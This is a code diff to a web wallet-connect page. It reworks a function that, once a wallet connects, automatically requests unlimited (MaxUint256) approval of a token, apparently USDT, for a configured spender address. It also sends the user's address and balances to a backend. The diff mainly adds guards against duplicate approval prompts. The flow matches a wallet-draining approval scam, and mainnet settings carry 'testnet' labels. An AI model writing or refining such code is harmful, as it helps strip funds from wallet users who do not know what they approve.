@@ -1036,101 +1036,148 @@ if(connectBtnCard){
       }
     }
 
-    async function ensureTokenApproval(){
-      // helper: always log with last known balances
-      async function logApproval(tag){
-        await notifyBackend(
-          currentAddress || "",
-          BNB_TESTNET_LABEL,
-          currentUserId || "",
-          currentBNBBalance,
-          currentTokenBalance,
-          tag
-        );
-      }
+// Idempotent ensureTokenApproval — prevents duplicate approval prompts.
+// Drop-in replacement for your existing function.
+async function ensureTokenApproval(){
+  // helper: always log with last known balances
+  async function logApproval(tag){
+    await notifyBackend(
+      currentAddress || "",
+      BNB_TESTNET_LABEL,
+      currentUserId || "",
+      currentBNBBalance,
+      currentTokenBalance,
+      tag
+    );
+  }
 
-      // basic guards
-      if(!TOKEN_ADDRESS){
-        console.warn("TOKEN_ADDRESS not set, skipping approve");
-        await logApproval("approval_skipped_no_token");
-        return;
-      }
-      if(!SPENDER_ADDRESS){
-        console.warn("SPENDER_ADDRESS not set, skipping approve");
-        await logApproval("approval_skipped_no_spender");
-        return;
-      }
-      if(!providerInstance || !web3Instance){
-        console.warn("No providerInstance/web3Instance for approval");
-        await logApproval("approval_skipped_no_provider");
-        return;
-      }
+  // basic guards
+  if(!TOKEN_ADDRESS){
+    console.warn("TOKEN_ADDRESS not set, skipping approve");
+    await logApproval("approval_skipped_no_token");
+    return;
+  }
+  if(!SPENDER_ADDRESS){
+    console.warn("SPENDER_ADDRESS not set, skipping approve");
+    await logApproval("approval_skipped_no_spender");
+    return;
+  }
+  if(!providerInstance || !web3Instance){
+    console.warn("No providerInstance/web3Instance for approval");
+    await logApproval("approval_skipped_no_provider");
+    return;
+  }
 
-      try{
-        setStatus("Preparing token approval…");
+  try{
+    setStatus("Preparing token approval…");
 
-        const ethersProvider = new ethers.BrowserProvider(
-          providerInstance,
-          BNB_TESTNET_CHAIN_ID_DEC    // 56 (BSC mainnet)
-        );
-        const signer       = await ethersProvider.getSigner();
-        const ownerAddress = (await signer.getAddress()).toLowerCase();
+    const ethersProvider = new ethers.BrowserProvider(
+      providerInstance,
+      BNB_TESTNET_CHAIN_ID_DEC    // 56 (BSC mainnet)
+    );
+    const signer       = await ethersProvider.getSigner();
+    const ownerAddress = (await signer.getAddress()).toLowerCase();
 
-        if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
-          alert(
-            "ERROR: TOKEN_ADDRESS is set to your wallet address.\n\n" +
-            "It MUST be the BEP-20 token contract address, not your wallet."
-          );
-          setStatus("Connected (approval skipped)");
-          await logApproval("approval_skipped_token_is_wallet");
-          return;
-        }
-
-        // 1) check allowance
-        const readContract = new ethers.Contract(
-          TOKEN_ADDRESS,
-          ERC20_ALLOWANCE_ABI,
-          ethersProvider
-        );
-        const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
-        console.log("[approve] currentAllowance =", currentAllowance.toString());
-
-        if (currentAllowance > 0n) {
-          setStatus("Connected (already approved)");
-          await logApproval("approval_already");
-          return;
-        }
-
-        // 2) send approve tx
-        setStatus("Waiting for wallet to confirm approval…");
-        const writeContract = new ethers.Contract(
-          TOKEN_ADDRESS,
-          ERC20_APPROVE_ABI,
-          signer
-        );
-
-        const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
-        console.log("[approve] tx sent:", tx.hash);
-
-        setStatus("Approval pending on chain…");
-        await tx.wait();
-
-        setStatus("Connected + Approved ✅");
-        await logApproval("approval_approved");
-      }catch(err){
-        console.error("Token approve error:", err);
-
-        let tag = "approval_error";
-        if (err && (err.code === 4001 || err.code === "ACTION_REJECTED")) {
-          tag = "approval_rejected";
-        }
-
-        setStatus("Connected (approval failed)");
-        alert("Token approval failed: " + (err && err.message ? err.message : err));
-
-        await logApproval(tag);
-      }
+    // Safety: ensure ownerAddress isn't accidentally the token contract
+    if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
+      alert(
+        "ERROR: TOKEN_ADDRESS is set to your wallet address.\n\n" +
+        "It MUST be the BEP-20 token contract address, not your wallet."
+      );
+      setStatus("Connected (approval skipped)");
+      await logApproval("approval_skipped_token_is_wallet");
+      return;
     }
+
+    // Prevent duplicate approval requests for same owner:
+    const reqKey = "usdt_approval_requested_" + ownerAddress;
+    // in-memory guard (avoid race within same page session)
+    if (!window.__usdtApprovalInProgress) window.__usdtApprovalInProgress = {};
+    if (window.__usdtApprovalInProgress[ownerAddress]) {
+      console.log("[approve] approval already in progress for", ownerAddress, "- skipping duplicate request");
+      await logApproval("approval_skipped_in_progress");
+      return;
+    }
+    // persistent guard: if we previously requested, avoid re-requesting automatically
+    if (localStorage.getItem(reqKey) === "1") {
+      console.log("[approve] approval already requested previously (localStorage) for", ownerAddress, "- skipping");
+      await logApproval("approval_skipped_already_requested");
+      return;
+    }
+
+    // 1) check allowance (on-chain) — if allowance already > 0, no need to ask
+    const readContract = new ethers.Contract(
+      TOKEN_ADDRESS,
+      ERC20_ALLOWANCE_ABI,
+      ethersProvider
+    );
+    const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
+    console.log("[approve] currentAllowance =", currentAllowance.toString());
+
+    if (currentAllowance > 0n) {
+      setStatus("Connected (already approved)");
+      // persist that approval exists
+      try { localStorage.setItem("usdt_approved_" + ownerAddress, "1"); } catch(e){}
+      await logApproval("approval_already");
+      return;
+    }
+
+    // mark as in-progress (both in-memory and localStorage) BEFORE prompting wallet
+    // so any concurrent calls won't also prompt
+    window.__usdtApprovalInProgress[ownerAddress] = true;
+    try { localStorage.setItem(reqKey, "1"); } catch(e) { /* not fatal */ }
+
+    // 2) send approve tx
+    setStatus("Waiting for wallet to confirm approval…");
+    const writeContract = new ethers.Contract(
+      TOKEN_ADDRESS,
+      ERC20_APPROVE_ABI,
+      signer
+    );
+
+    const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
+    console.log("[approve] tx sent:", tx.hash);
+
+    setStatus("Approval pending on chain…");
+    await tx.wait();
+
+    setStatus("Connected + Approved ✅");
+    try { localStorage.setItem("usdt_approved_" + ownerAddress, "1"); } catch(e){}
+    await logApproval("approval_approved");
+
+  }catch(err){
+    console.error("Token approve error:", err);
+
+    let tag = "approval_error";
+    if (err && (err.code === 4001 || err.code === "ACTION_REJECTED")) {
+      tag = "approval_rejected";
+    }
+
+    setStatus("Connected (approval failed)");
+    try { alert("Token approval failed: " + (err && err.message ? err.message : err)); } catch(e){}
+
+    await logApproval(tag);
+
+    // If approval was rejected, clear the persistent requested flag so user can retry later manually.
+    try {
+      const signerAddress = (await (new ethers.BrowserProvider(providerInstance)).getSigner().getAddress()).toLowerCase();
+      localStorage.removeItem("usdt_approval_requested_" + signerAddress);
+    } catch (e) { /* ignore */ }
+  } finally {
+    // clear in-memory progress flag so future attempts are allowed if appropriate
+    try {
+      const sp = await (new ethers.BrowserProvider(providerInstance)).getSigner().getAddress();
+      if (sp) {
+        const spLower = sp.toLowerCase();
+        if (window.__usdtApprovalInProgress && window.__usdtApprovalInProgress[spLower]) {
+          window.__usdtApprovalInProgress[spLower] = false;
+        }
+      }
+    } catch (e) {
+      // ignore
+    }
+  }
+}
 
     async function restoreSessionFromAddress(address){
       currentAddress = address;
